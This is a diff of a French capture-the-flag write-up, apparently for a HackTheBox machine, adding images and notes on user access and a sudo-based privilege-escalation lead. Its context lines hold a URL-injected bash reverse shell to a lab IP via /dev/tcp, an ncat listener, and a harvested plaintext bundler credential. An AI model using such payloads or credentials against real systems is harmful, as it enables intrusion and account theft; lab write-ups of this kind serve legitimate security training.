@@ -60,7 +60,7 @@ http://10.10.14.213:8000/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.
 
 Ouvrons notre listener netcat  et injectons la commande précedante &#x20;
 
-```
+```bash
 PS C:\Users\Apotheas> ncat -nvlp 1234
 Ncat: Version 7.93 ( https://nmap.org/ncat )
 Ncat: Listening on :::1234
@@ -89,3 +89,11 @@ BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
 ```
 
 Surement la clef SSH  !  lets try it  !&#x20;
+
+<figure><img src="../../.gitbook/assets/ssh-precious.png" alt=""><figcaption></figcaption></figure>
+
+Le premier flaf user se trouvait dans le fichier user.txt ! cherchons maintenant un moyen de chopper le flag root.&#x20;
+
+<figure><img src="../../.gitbook/assets/yaml-precious.png" alt=""><figcaption></figcaption></figure>
+
+Avec un "sudo -l " on s'apercoit que le user Henry a les droit pour lancer un script .yaml qui charge un fichier de dependance via la méthode File.read().
